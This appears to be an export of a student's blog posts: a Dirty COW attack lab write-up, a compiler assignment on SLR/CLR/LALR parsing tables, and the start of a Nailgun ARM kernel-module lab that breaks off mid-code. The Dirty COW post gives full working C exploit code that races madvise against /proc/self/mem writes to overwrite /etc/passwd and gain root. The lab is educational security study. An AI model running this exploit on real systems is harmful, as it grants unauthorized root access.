[{"title":"Dirty COW Attack Lab","url":"/2025/11/Dirty-COW-Attack/","content":"Task 1: Modify a Dummy\nRead-Only File\n1. create a dummy file\n\n\n3\n\nwe can see that if we try to write to this file as a normal user, we\nwill fail, because the file is only readable to normal users.\n\n2. Set Up the Memory Mapping\nThread\nThe main thread /* cow_attack.c (the main thread) */#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;void *map;void *writeThread(void *arg);void *madviseThread(void *arg);int main(int argc,char *argv[])&#123;    pthread_t pth1,pth2;    struct stat st;    int file_size;    // Open the target file in the read-only mode.    int f = open(&quot;/zzz&quot;, O_RDONLY);    // Map the file to COW memory using MAP_PRIVATE.    fstat(f, &amp;st);    file_size = st.st_size;    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);    // Find the position of the target area    char *position = strstr(map,&quot;222222&quot;);    // We have to do the attack using two threads.    pthread_create(&amp;pth1, NULL, madviseThread, (void *)file_size);    pthread_create(&amp;pth2, NULL, writeThread, position);    //Wait for the threads to finish.    pthread_join(pth1,NULL);    pthread_join(pth2,NULL);    return 0;&#125;\nmmap: Maps a file or device into memory, allowing the file’s contents\nto be accessed like an array in virtual memory.\n\n1st arg: Starting address for the mapped memory (usually set to NULL\nto let the kernel choose)\n\n2nd arg: Size of the mapped memory (in bytes, typically\npage-aligned)\n\n3rd arg: If the memory is readable or writable (PROT_READ,\nPROT_WRITE, etc.)\n\n4th arg: If updates are shared with other processes or kept private\n(MAP_SHARED or MAP_PRIVATE)\n\n5th arg: File that needs to be mapped (file descriptor from\nopen)\n\n6th arg: Offset indicating from where inside the file the mapping\nshould start (must be page-aligned)\n\n3. Set Up the write Thread\nvoid *writeThread(void *arg)&#123;    char *content = &quot;******&quot;;    off_t offset = (off_t)arg;    int f = open(&quot;/proc/self/mem&quot;, O_RDWR);    while(1)&#123;        // Move the file pointer to the corresponding position.        lseek(f, offset, SEEK_SET);        // Write to the memory.        write(f, content, strlen(content));    &#125;&#125;\n4. The madvise Thread\nvoid *madviseThread(void *arg)&#123;    int file_size = (int)arg;    while(1)&#123;        madvise(map, file_size, MADV_DONTNEED);    &#125;&#125;\nmadvise: Provides advice to the kernel about how a specific memory\nregion will be used, allowing the kernel to optimize memory\nhandling.\n\n1st arg: Starting address of the memory region\n\n2nd arg: Size of the memory region (in bytes)\n\n3rd arg: Advice hint for how the memory will be used (e.g.,\nMADV_NORMAL, MADV_SEQUENTIAL, MADV_DONTNEED)\n\nMADV_DONTNEED: The data in the specified memory range is no\nlonger needed. The kernel can discard the pages;\n5. Launch the Attack\n\nWe are able to see a modified /zzz file\nTask\n2: Modify the Password File to Gain the Root Privilege\nWe create a new account called charlie, and we will turn this normal\nuser into root using the Dirty COW attack. Adding a new account can be\nachieved using the adduser command. After the account is created, a new\nrecord will be added to /etc/passwd. See the following\n\nThe main thread #include &lt;fcntl.h&gt;#include &lt;pthread.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;void *map;void *writeThread(void *arg);void *madviseThread(void *arg);int main(int argc, char *argv[])&#123;    pthread_t pth1,pth2;    struct stat st;    int file_size;    // Open the /etc/passwd in the read-only mode.    int f = open(&quot;/etc/passwd&quot;, O_RDONLY);    // Map the file to COW memory using MAP_PRIVATE.    fstat(f, &amp;st);    file_size = st.st_size;    map = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);    // Find the position of the target area(charlie:x:1001 -&gt; charlie:x:0000)    char *position = strstr(map,&quot;charlie:x:1001&quot;);    // We have to do the attack using two threads.    pthread_create(&amp;pth1, NULL, madviseThread, (void *)file_size);    pthread_create(&amp;pth2, NULL, writeThread, position);    //Wait for the threads to finish.    pthread_join(pth1, NULL);    pthread_join(pth2, NULL);    return 0;&#125;\nThe write Thread void *writeThread(void *arg)&#123;    char *content = &quot;charlie:x:0000&quot;;  //set the charlie&#x27;s id to 0(root)    off_t offset = (off_t) arg;    int f = open(&quot;/proc/self/mem&quot;, O_RDWR);    while(1)&#123;        // Move the file pointer to the corresponding position.        lseek(f, offset, SEEK_SET);        // Write to the memory.        write(f, content, strlen(content));    &#125;&#125;\nThe madvise Thread void *madviseThread(void *arg)&#123;    int file_size = (int)arg;    while(1)&#123;        madvise(map,file_size, MADV_DONTNEED);    &#125;&#125;\nAfter compile the cow_attack.c with gcc cow_attack.c -lpthread\nWe run the a.out and press Ctrl-C after a few\nseconds\n\nIf we switch user to charlie, we are able to see the root shell. If\nyou run the id command, you should be able to see that you have gained\nthe root privilege.\n","categories":["Computer Science"],"tags":["Security","Linux","Attack"]},{"title":"CS323 Written Assignment 4 - SLR, CLR, and LALR Parsing","url":"/2025/11/CS323-Assignment-4/","content":"Exercise 1: Consider the following grammar G, which\nyou have seen in the previous assignment:\nE -&gt; TXX -&gt; +E | εT -&gt; FYY -&gt; T | εF -&gt; PZZ -&gt; *Z | εP -&gt; (E) | a | b\n1. Please construct the SLR parsing table for G. Is\nthe grammar SLR(1)?\n\n\n\n\n\n\n\n\n(Non-Terminal)\nFIRST Set\nFOLLOW Set\n\n\n\n\nE\n{(,a, b}\n{$, )}\n\n\nT\n{(,a, b}\n{$, ), +}\n\n\nX\n{ε, +}\n{$, )}\n\n\nF\n{(,a, b}\n{$, (,), +, a, b}\n\n\nY\n{ε, (,a, b}\n{$, ), +}\n\n\nP\n{(,a, b}\n{$, (,), *, +, a, b}\n\n\nZ\n{ε, *}\n{$, (,), +, a, b}\n\n\n\n\n$$\n\\begin{aligned}\n(1) &amp; \\quad E \\to TX \\\\\n(2) &amp; \\quad X \\to +E \\\\\n(3) &amp; \\quad X \\to \\varepsilon \\\\\n(4) &amp; \\quad T \\to FY \\\\\n(5) &amp; \\quad Y \\to T \\\\\n(6) &amp; \\quad Y \\to \\varepsilon \\\\\n(7) &amp; \\quad F \\to PZ \\\\\n(8) &amp; \\quad Z \\to *Z \\\\\n(9) &amp; \\quad Z \\to \\varepsilon \\\\\n(10) &amp; \\quad P \\to (E) \\\\\n(11) &amp; \\quad P \\to a \\\\\n(12) &amp; \\quad P \\to b\n\\end{aligned}\n$$\nAugmented grammar: Introduce a new symbol E’ and add a new production\nE' -&gt; E\nI0 = closure(&#123;[E&#x27;-&gt;•E]&#125;)   = &#123;[E&#x27;-&gt;•E], [E-&gt;•TX], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]&#125;I1 = closure(GOTO(I0, E))   = closure(&#123;[E&#x27;-&gt;E•]&#125;)   = &#123;[E&#x27;-&gt;E•]&#125;I2 = closure(GOTO(I0, T))   = closure(&#123;[E-&gt;T•X]&#125;)   = &#123;[E-&gt;T•X], [X-&gt;•+E], [X-&gt;•]&#125;I3 = closure(GOTO(I0, F))   = closure(&#123;[T-&gt;F•Y]&#125;)   = &#123;[T-&gt;F•Y], [Y-&gt;•T], [Y-&gt;•], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]&#125;I4 = closure(GOTO(I0, P))   = closure(&#123;[F-&gt;P•Z]&#125;)   = &#123;[F-&gt;P•Z], [Z-&gt;•*Z], [Z-&gt;•]&#125;I5 = closure(GOTO(I0, ( ))   = closure(&#123;[P-&gt;(•E)]&#125;)   = &#123;[P-&gt;(•E)], [E-&gt;•TX], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]&#125;I6 = closure(GOTO(I0, a))   = closure(&#123;[P-&gt;a•]&#125;)   = &#123;[P-&gt;a•]&#125;I7 = closure(GOTO(I0, b))   = closure(&#123;[P-&gt;b•]&#125;)   = &#123;[P-&gt;b•]&#125;I8 = closure(GOTO(I2, X))   = closure(&#123;[E-&gt;TX•]&#125;)   = &#123;[E-&gt;TX•]&#125;I9 = closure(GOTO(I2, +))   = closure(&#123;[X-&gt;+•E]&#125;)   = &#123;[X-&gt;+•E], [E-&gt;•TX], [T-&gt;•FY], [F-&gt;•PZ], [P-&gt;•(E)], [P-&gt;•a], [P-&gt;•b]&#125;I10 = closure(GOTO(I3, Y))    = closure(&#123;[T-&gt;FY•]&#125;)    = &#123;[T-&gt;FY•]&#125;I11 = closure(GOTO(I3,T))    = closure(&#123;[Y-&gt;T•]&#125;)    = &#123;[Y-&gt;T•]&#125;I3 = closure(GOTO(I3, F))   = closure(&#123;T-&gt;F•Y&#125;)I4 = closure(GOTO(I3, P))   = closure(&#123;[F-&gt;P•Z]&#125;)I5 = closure(GOTO(I3, ( ))   = closure(&#123;[P-&gt;(•E)]&#125;)I6 = closure(GOTO(I3, a))I7 = closure(GOTO(I3, b))I12 = closure(GOTO(I4, Z))    = closure(&#123;[F-&gt;PZ•]&#125;)    = &#123;[F-&gt;PZ•]&#125;I13 = closure(GOTO(I4, *))    = closure(&#123;Z-&gt;*•Z&#125;)    = &#123;[Z-&gt;*•Z], [Z-&gt;•*Z], [Z-&gt;•]&#125;I14 = closure(GOTO(I5, E))    = closure(&#123;[P-&gt;(E•)]&#125;)    = &#123;[P-&gt;(E•)]&#125;I2 = closure(GOTO(I5, T))I3 = closure(GOTO(I5, F))I4 = closure(GOTO(I5, P))I5 = closure(GOTO(I5, ( )I6 = closure(GOTO(I5, a))I7 = closure(GOTO(I5, b))I15 = closure(GOTO(I9, E))    = closure(&#123;[X-&gt;+E•]&#125;)    = &#123;[X-&gt;+E•]&#125;I2 = closure(GOTO(I9, T))I3 = closure(GOTO(I9, F))I4 = closure(GOTO(I9, P))I5 = closure(GOTO(I9, ( )I6 = closure(GOTO(I9, a))I7 = closure(GOTO(I9, b))I16 = closure(GOTO(I13, Z))    = closure(&#123;[Z-&gt;*Z•]&#125;)\t= &#123;[Z-&gt;*Z•]&#125;I13 = closure(GOTO(I13, *))I17 = closure(GOTO(I14, ) ))\t= &#123;[P-&gt;(E)•]&#125;\n\nThe SLR parsing table\n\n\n\nState\n\n\nACTION\n\n\nGOTO\n\n\n\n\na\n\n\nb\n\n\n+\n\n\n*\n\n\n(\n\n\n)\n\n\n$\n\n\nE\n\n\nT\n\n\nX\n\n\nF\n\n\nY\n\n\nP\n\n\nZ\n\n\n\n\n0\n\n\ns6\n\n\ns7\n\n\n\n\n\n\ns5\n\n\n\n\n\n\n1\n\n\n2\n\n\n\n\n3\n\n\n\n\n4\n\n\n\n\n\n\n1\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nacc\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n2\n\n\n\n\n\n\ns9\n\n\n\n\ns5\n\n\nr3\n\n\nr3\n\n\n\n\n\n\n8\n\n\n\n\n\n\n\n\n\n\n\n\n3\n\n\ns6\n\n\ns7\n\n\nr6\n\n\n\n\n\n\nr6\n\n\nr6\n\n\n\n\n11\n\n\n\n\n3\n\n\n10\n\n\n4\n\n\n\n\n\n\n4\n\n\nr9\n\n\nr9\n\n\nr9\n\n\ns13\n\n\nr9\n\n\nr9\n\n\nr9\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n12\n\n\n\n\n5\n\n\ns6\n\n\ns7\n\n\n\n\n\n\ns5\n\n\n\n\n\n\n14\n\n\n2\n\n\n\n\n3\n\n\n\n\n4\n\n\n\n\n\n\n6\n\n\nr11\n\n\nr11\n\n\nr11\n\n\nr11\n\n\nr11\n\n\nr11\n\n\nr11\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n7\n\n\nr12\n\n\nr12\n\n\nr12\n\n\nr12\n\n\nr12\n\n\nr12\n\n\nr12\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n8\n\n\n\n\n\n\n\n\n\n\n\n\nr1\n\n\nr1\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n9\n\n\ns6\n\n\ns7\n\n\n\n\n\n\ns5\n\n\n\n\n\n\n15\n\n\n2\n\n\n\n\n3\n\n\n\n\n4\n\n\n\n\n\n\n10\n\n\n\n\n\n\nr4\n\n\n\n\n\n\nr4\n\n\nr4\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n11\n\n\n\n\n\n\nr5\n\n\n\n\n\n\nr5\n\n\nr5\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n12\n\n\nr7\n\n\nr7\n\n\nr7\n\n\n\n\nr7\n\n\nr7\n\n\nr7\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n13\n\n\nr9\n\n\nr9\n\n\nr9\n\n\ns13\n\n\nr9\n\n\nr9\n\n\nr9\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n16\n\n\n\n\n14\n\n\n\n\n\n\n\n\n\n\n\n\ns17\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n15\n\n\n\n\n\n\n\n\n\n\n\n\nr2\n\n\nr2\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n16\n\n\nr8\n\n\nr8\n\n\nr8\n\n\n\n\nr8\n\n\nr8\n\n\nr8\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n17\n\n\nr10\n\n\nr10\n\n\nr10\n\n\nr10\n\n\nr10\n\n\nr10\n\n\nr10\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nThe grammar is SLR(1), because there are no conflict during the\nparsing table construction.\n2. Give the parsing steps for the input string\n(a∗+b)+b. If there are conflicts in the parsing table, please address\nthem reasonably.\n\n\n\nLINE\nSTACK\nSYMBOLS\nINPUT\nACTION\n\n\n\n\n(1)\n0\n$\n(a*+b)+b$\nshift to 5\n\n\n(2)\n0 5\n$ (\na*+b)+b$\nshift to 6\n\n\n(3)\n0 5 6\n$ ( a\n*+b)+b$\nreduce by P-&gt;a\n\n\n(4)\n0 5 4\n$ ( P\n*+b)+b$\nshift to 13\n\n\n(5)\n0 5 4 13\n$ ( P *\n+b)+b$\nreduce by Z-&gt;ε\n\n\n(6)\n0 5 4 13 16\n$ ( P * Z\n+b)+b$\nreduce by Z-&gt;*Z\n\n\n(7)\n0 5 4 12\n$ ( P Z\n+b)+b$\nreduce by F-&gt;PZ\n\n\n(8)\n0 5 3\n$ ( F\n+b)+b$\nreduce by Y-&gt;ε\n\n\n(9)\n0 5 3 10\n$ ( F Y\n+b)+b$\nreduce by T-&gt;FY\n\n\n(10)\n0 5 2\n$ ( T\n+b)+b$\nshift to 9\n\n\n(11)\n0 5 2 9\n$ ( T +\nb)+b$\nshift to 7\n\n\n(12)\n0 5 2 9 7\n$ ( T + b\n)+b$\nreduce by P-&gt;b\n\n\n(13)\n0 5 2 9 4\n$ ( T + P\n)+b$\nreduce by Z-&gt;ε\n\n\n(14)\n0 5 2 9 4 12\n$ ( T + PZ\n)+b$\nreduce by F-&gt;PZ\n\n\n(15)\n0 5 2 9 3\n$ ( T + F\n)+b$\nreduce by Y-&gt;ε\n\n\n(16)\n0 5 2 9 3 10\n$ ( T + FY\n)+b$\nreduce by T-&gt;FY\n\n\n(17)\n0 5 2 9 2\n$ ( T + T\n)+b$\nreduce by X-&gt;ε\n\n\n(18)\n0 5 2 9 2 8\n$ ( T + TX\n)+b$\nreduce by E-&gt;TX\n\n\n(19)\n0 5 2 9 15\n$ ( T + E\n)+b$\nreduce by X-&gt;+E\n\n\n(20)\n0 5 2 8\n$ ( T X\n)+b$\nreduce by E-&gt;TX\n\n\n(21)\n0 5 14\n$ ( E\n)+b$\nshift to 17\n\n\n(22)\n0 5 14 17\n$ ( E )\n+b$\nreduce by P-&gt;(E)\n\n\n(23)\n0 4\n$ P\n+b$\nreduce by Z-&gt;ε\n\n\n(24)\n0 4 12\n$ P Z\n+b$\nreduce by F-&gt;PZ\n\n\n(25)\n0 3\n$ F\n+b$\nreduce by Y-&gt;ε\n\n\n(26)\n0 3 10\n$ FY\n+b$\nreduce by T-&gt;FY\n\n\n(27)\n0 2\n$ T\n+b$\nshift to 9\n\n\n(28)\n0 2 9\n$ T +\nb$\nshift to 7\n\n\n(29)\n0 2 9 7\n$ T + b\n$\nreduce by P-&gt;b\n\n\n(30)\n0 2 9 4\n$ T + P\n$\nreduce by Z-&gt;ε\n\n\n(31)\n0 2 9 4 12\n$ T + PZ\n$\nreduce by F-&gt;PZ\n\n\n(32)\n0 2 9 3\n$ T + F\n$\nreduce by Y-&gt;ε\n\n\n(33)\n0 2 9 3 10\n$ T + F Y\n$\nreduce by T-&gt;FY\n\n\n(34)\n0 2 9 2\n$ T + T\n$\nreduce by X-&gt;ε\n\n\n(35)\n0 2 9 2 8\n$ T + TX\n$\nreduce by E-&gt;TX\n\n\n(36)\n0 2 9 15\n$ T + E\n$\nreduce by X-&gt;+E\n\n\n(37)\n0 2 8\n$ T X\n$\nreduce by E-&gt;TX\n\n\n(38)\n0 1\n$ E\n$\naccept\n\n\n\nExercise 2: Consider the following grammar G:\nS -&gt; 0AA -&gt; S1A | ε\n1. Please construct the shift-reduce parsing table\nfor the above grammar G using each of the following algorithms: (1) SLR,\n(2) CLR, and (3) LALR.\n\nSLR\n\nFIRST(S) = {0}\nFOLLOW(S) = {1, $}\nFIRST(A) = {ε, 0}\nFOLLOW(A) = {1, $}\n(1) S -&gt; 0A(2) A -&gt; S1A(3) A -&gt; ε\nAugmented grammar: Introduce a new symbol S’ and add a new production\nS' -&gt; S\nI0 = closure(&#123;[S&#x27;-&gt;•S]&#125;)   = &#123;[S&#x27;-&gt;•S], [S-&gt;•0A]&#125;I1 = closure(GOTO(I0, S))   = closure(&#123;[S&#x27;-&gt;S•]&#125;)   = &#123;[S&#x27;-&gt;S•]&#125;I2 = closure(GOTO(I0, 0))   = closure(&#123;[S-&gt;0•A]&#125;)   = &#123;[S-&gt;0•A], [A-&gt;•S1A], [S-&gt;•0A], [A-&gt;•]&#125;I3 = closure(GOTO(I2, S))   = closure(&#123;[A-&gt;S•1A]&#125;)   = &#123;[A-&gt;S•1A]&#125;I4 = closure(GOTO(I2, A))   = closure(&#123;[S-&gt;0A•]&#125;)   = &#123;[S-&gt;0A•]&#125;I2 = closure(GOTO(I2, 0))   = closure(&#123;[S-&gt;0•A]&#125;)I5 = closure(GOTO(I3, 1))   = closure(&#123;[A-&gt;S1•A]&#125;)   = &#123;[A-&gt;S1•A], [A-&gt;•S1A], [S-&gt;•0A], [A-&gt;•]&#125;I3 = closure(GOTO(I5, S))   = closure(&#123;[A-&gt;S•1A]&#125;)I6 = closure(GOTO(I5, A))   = closure(&#123;A-&gt;S1A•&#125;)   = &#123;[A-&gt;S1A•]&#125;I2 = closure(GOTO(I5, 0))   = closure(&#123;[S-&gt;0•A]&#125;)\nthe shift-reduce parsing table using SLR\n\n\n\nState\n\n\nACTION\n\n\nGOTO\n\n\n\n\n0\n\n\n1\n\n\n$\n\n\nS\n\n\nA\n\n\n\n\n0\n\n\ns2\n\n\n\n\n\n\n1\n\n\n\n\n\n\n1\n\n\n\n\n\n\nacc\n\n\n\n\n\n\n\n\n2\n\n\ns2\n\n\nr3\n\n\nr3\n\n\n3\n\n\n4\n\n\n\n\n3\n\n\n\n\ns5\n\n\n\n\n\n\n\n\n\n\n4\n\n\n\n\nr1\n\n\nr1\n\n\n\n\n\n\n\n\n5\n\n\ns2\n\n\nr3\n\n\nr3\n\n\n3\n\n\n6\n\n\n\n\n6\n\n\n\n\nr2\n\n\nr2\n\n\n\n\n\n\n\n\nCLR\n\nFIRST(S) = {0}\nFOLLOW(S) = {1, $}\nFIRST(A) = {ε, 0}\nFOLLOW(A) = {1, $}\n(1) S -&gt; 0A(2) A -&gt; S1A(3) A -&gt; ε\nAugmented grammar: Introduce a new symbol S’ and add a new production\nS' -&gt; S\nFIRST($) = {$}\nFIRST(1A$) = {1}\nI0 = closure(&#123;[S&#x27;-&gt;•S, $]&#125;)   = &#123;[S&#x27;-&gt;•S, $], [S-&gt;•0A, $]&#125;I1 = closure(GOTO(I0, S))   = &#123;[S&#x27;-&gt;S•, $]&#125;I2 = closure(GOTO(I0, 0))   = closure(&#123;[S-&gt;0•A, $]&#125;)   = &#123;[S-&gt;0•A, $], [A-&gt;•S1A, $], [S-&gt;•0A, 1], [A-&gt;•, $]&#125;I3 = closure(GOTO(I2, S))   = closure(&#123;[A-&gt;S•1A, $]&#125;)   = &#123;[A-&gt;S•1A, $]&#125;I4 = closure(GOTO(I2, A))   = closure(&#123;[S-&gt;0A, $]&#125;)   = &#123;[S-&gt;0A•,$]&#125;I5 = closure(GOTO(I2, 0))   = closure(&#123;[S-&gt;0•A, 1]&#125;)   = &#123;[S-&gt;0•A, 1], [A-&gt;•S1A, 1], [S-&gt;•0A, 1], [A-&gt;•, 1]&#125;I6 = closure(GOTO(I3, 1))   = closure(&#123;[A-&gt;S1•A, $]&#125;)   = &#123;[A-&gt;S1•A, $], [A-&gt;•S1A, $], [S-&gt;•0A, 1], [A-&gt;•, $]&#125;I7 = closure(GOTO(I5, S))   = closure(&#123;[A-&gt;S•1A, 1]&#125;)   = &#123;[A-&gt;S•1A, 1]&#125;I8 = closure(GOTO(I5, A))   = closure(&#123;[S-&gt;0A•, 1]&#125;)   = &#123;[S-&gt;0A•, 1]&#125;I5 = closure(GOTO(I5, 0))   = closure(&#123;[S-&gt;0•A, 1]&#125;)I3 = closure(GOTO(I6, S))   = closure(&#123;[A-&gt;S•1A, $]&#125;)I9 = closure(GOTO(I6, A))   = closure(&#123;[A-&gt;S1A•, $]&#125;)   = &#123;[A-&gt;S1A•, $]&#125;I5 = closure(GOTO(I6, 0))   = closure(&#123;[S-&gt;0•A, 1]&#125;)I10= closure(GOTO(I7, 1))   = closure(&#123;[A-&gt;S1•A, 1]&#125;)   = &#123;[A-&gt;S1•A, 1], [A-&gt;•S1A, 1], [S-&gt;•0A, 1], [A-&gt;•, 1]&#125;I7 = closure(GOTO(I10, S))   = closure(&#123;[A-&gt;S•1A, 1]&#125;)I11= closure(GOTO(I10, A))   = closure(&#123;[A-&gt;S1A•, 1]&#125;)   = &#123;[A-&gt;S1A•, 1]&#125;I5 = closure(GOTO(I10, 0))   = closure(&#123;[S-&gt;0•A, 1]&#125;)\nthe shift-reduce parsing table using CLR\n\n\n\nState\n\n\nACTION\n\n\nGOTO\n\n\n\n\n0\n\n\n1\n\n\n$\n\n\nS\n\n\nA\n\n\n\n\n0\n\n\ns2\n\n\n\n\n\n\n1\n\n\n\n\n\n\n1\n\n\n\n\n\n\nacc\n\n\n\n\n\n\n\n\n2\n\n\ns5\n\n\n\n\nr3\n\n\n3\n\n\n4\n\n\n\n\n3\n\n\n\n\ns6\n\n\n\n\n\n\n\n\n\n\n4\n\n\n\n\n\n\nr1\n\n\n\n\n\n\n\n\n5\n\n\ns5\n\n\nr3\n\n\n\n\n7\n\n\n8\n\n\n\n\n6\n\n\ns5\n\n\n\n\nr3\n\n\n3\n\n\n9\n\n\n\n\n7\n\n\n\n\ns10\n\n\n\n\n\n\n\n\n\n\n8\n\n\n\n\nr1\n\n\n\n\n\n\n\n\n\n\n9\n\n\n\n\n\n\nr2\n\n\n\n\n\n\n\n\n10\n\n\ns5\n\n\nr3\n\n\n\n\n7\n\n\n11\n\n\n\n\n11\n\n\n\n\nr2\n\n\n\n\n\n\n\n\n\n\nLALR\n\nI25 = I2 U I5 = &#123;[S-&gt;0•A, 1/$], [A-&gt;•S1A, 1/$], [S-&gt;•0A, 1], [A-&gt;•, 1/$]&#125;I37 = I3 U I7 = &#123;[A-&gt;S•1A, 1/$]&#125;I48 = I4 U I8 = &#123;[S-&gt;0A•,1/$]&#125;I6_10 = I6 U I10 = &#123;[A-&gt;S1•A, 1/$], [A-&gt;•S1A, 1/$], [S-&gt;•0A, 1], [A-&gt;•, 1/$]&#125;I9_11 = I9 U I11 = &#123;[A-&gt;S1A•, 1/$]&#125;\nState 0: I0State 1: I1State 2: I25State 3: I37State 4: I48State 5: I6_10State 6: I9_11\n\n\n\nState\n\n\nACTION\n\n\nGOTO\n\n\n\n\n0\n\n\n1\n\n\n$\n\n\nS\n\n\nA\n\n\n\n\n0\n\n\ns2\n\n\n\n\n\n\n1\n\n\n\n\n\n\n1\n\n\n\n\n\n\nacc\n\n\n\n\n\n\n\n\n2\n\n\ns2\n\n\nr3\n\n\nr3\n\n\n3\n\n\n4\n\n\n\n\n3\n\n\n\n\ns5\n\n\n\n\n\n\n\n\n\n\n4\n\n\n\n\nr1\n\n\nr1\n\n\n\n\n\n\n\n\n5\n\n\ns2\n\n\nr3\n\n\nr3\n\n\n3\n\n\n6\n\n\n\n\n6\n\n\n\n\nr2\n\n\nr2\n\n\n\n\n\n\n\n2. Is the grammar SLR(1)? Is it LR(1)? Is it\nLALR(1)?\nYes, this grammar is SLR(1), LR(1), and LALR(1). The SLR(1) parsing\ntable with 7 states has no conflicts despite using coarser FOLLOW sets,\nthe LR(1) (CLR) table with 12 states is conflict-free using precise\nlookaheads, and the LALR(1) table successfully merges core-equivalent\nLR(1) states back to 7 states without introducing any new conflicts.\n3. Can an LALR(1) parser accept the string\n000001111? If yes, please list the parsing steps; otherwise, please\nstate the reason. Before parsing, please address conflicts in the\nparsing table if any.\nLALR(1) parser can accept the string 000001111\n\n\n\n\n\n\n\n\n\n\nLINE\nSTACK\nSYMBOLS\nINPUT\nACTION\n\n\n\n\n(1)\n0\n$\n000001111$\nshift to 2\n\n\n(2)\n0 2\n$ 0\n00001111$\nshift to 2\n\n\n(3)\n0 2 2\n$ 0 0\n0001111$\nshift to 2\n\n\n(4)\n0 2 2 2\n$ 0 0 0\n001111$\nshift to 2\n\n\n(5)\n0 2 2 2 2\n$ 0 0 0 0\n01111$\nshift to 2\n\n\n(6)\n0 2 2 2 2 2\n$ 0 0 0 0 0\n1111$\nreduce by A-&gt;ε\n\n\n(7)\n0 2 2 2 2 2 4\n$ 0 0 0 0 0 A\n1111$\nreduce by S-&gt;0A\n\n\n(8)\n0 2 2 2 2 3\n$ 0 0 0 0 S\n1111$\nshift to 5\n\n\n(9)\n0 2 2 2 2 3 5\n$ 0 0 0 0 S 1\n111$\nreduce by A-&gt;ε\n\n\n(10)\n0 2 2 2 2 3 5 6\n$ 0 0 0 0 S 1 A\n111$\nreduce by A-&gt;S1A\n\n\n(11)\n0 2 2 2 2 4\n$ 0 0 0 0 A\n111$\nreduce by S-&gt;0A\n\n\n(12)\n0 2 2 2 3\n$ 0 0 0 S\n111$\nshift to 5\n\n\n(13)\n0 2 2 2 3 5\n$ 0 0 0 S 1\n11$\nreduce by A-&gt;ε\n\n\n(14)\n0 2 2 2 3 5 6\n$ 0 0 0 S 1 A\n11$\nreduce by A-&gt;S1A\n\n\n（15）\n0 2 2 2 4\n$ 0 0 0 A\n11$\nreduce by S-&gt;0A\n\n\n(16)\n0 2 2 3\n$ 0 0 S\n11$\nshift to 5\n\n\n(17)\n0 2 2 3 5\n$ 0 0 S 1\n1$\nreduce by A-&gt;ε\n\n\n(18)\n0 2 2 3 5 6\n$ 0 0 S 1 A\n1$\nreduce by A-&gt;S1A\n\n\n(19)\n0 2 2 4\n$ 0 0 A\n1$\nreduce by S-&gt;0A\n\n\n(20)\n0 2 3\n$ 0 S\n1$\nshift to 5\n\n\n(21)\n0 2 3 5\n$ 0 S 1\n$\nreduce by A-&gt;ε\n\n\n(22)\n0 2 3 5 6\n$ 0 S 1 A\n$\nreduce A-&gt;S1A\n\n\n(23)\n0 2 4\n$ 0 A\n$\nreduce by S-&gt;0A\n\n\n(24)\n0 1\n$ S\n$\naccept\n\n\n\n","categories":["Computer Science"],"tags":["Compiler","CS323","Parsing","SLR","CLR","LALR"]},{"title":"Nailgun Attack Lab Analysis","url":"/2025/11/Nailgun-Attack-Lab-Analysis/","content":"Task 1: Create and\nInstall a Kernel Module\nsimple_module.c\n/* simple_module.c */#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;#include &lt;asm/io.h&gt;static int __init simple_module_init(void)&#123;        printk(&quot;Helloworld.\\n&quot;);        return 0;&#125;/* *The cleanup function of the module. */static void __exit simple_module_exit(void)&#123;        printk(KERN_INFO&quot;Exit.\\n&quot;);&#125;module_init(simple_module_init);module_exit(simple_module_exit);\n\nMakefile\nobj-m += simple_module.oall:        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean:        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n\n\n\nQuestion 1 : What is the exception level and the\nsecurity state of the core with loaded LKM?\n\nThe core runs at Exception Level 1 (EL1) and in the\nNon-secure (Normal World) security state when the LKM\nis loaded.\nTask 2:\nDirectly Access a High Privilege Register: SCR\n\n/* simple_module.c */...static int __init simple_module_init(void)&#123;        uint32_t reg;        asm volatile(&quot;mrc p15, 0, %0, c1, c1, 0&quot;:&quot;=r&quot;(reg));        printk(KERN_INFO &quot;SCR %x.\\n&quot;, reg);        return 0;&#125;...\n\nTask 2.a : What is the complete instruction? Look up the manual and\nfill the instruction bellow. Then compile and execute.\n\ncomplete instruction:\nmrc p15, 0, &lt;Rt&gt;, c1, c1, 0\ncompile\n\ntry to install this kernel module\n\nA segmentation fault occurs.\n\nTask 2.b : Why the segmentation fault occurs?\n\nThe segmentation fault occurs because the kernel module executes a\nprivileged instruction that is not allowed in the current processor\nmode.\nSpecifically, the inline assembly instruction\nmrc p15, 0, &lt;Rt&gt;, c1, c1, 0\ntries to access the Secure Configuration Register (SCR), which\nbelongs to the secure world.\nHowever, the Linux kernel runs in the non-secure world at\nEL1.\nTask 3: Read the\nDebug Authentication Signal\n\n\n\nTask 3.a: What is the instruction to read DBGAUTHSTATUS?\n\nmrc p14, 0, &lt;Rt&gt;, c7, c14, 6\ndbgauth_module.c\n/* dbgauth_module.c */#include &lt;linux/module.h&gt;#include 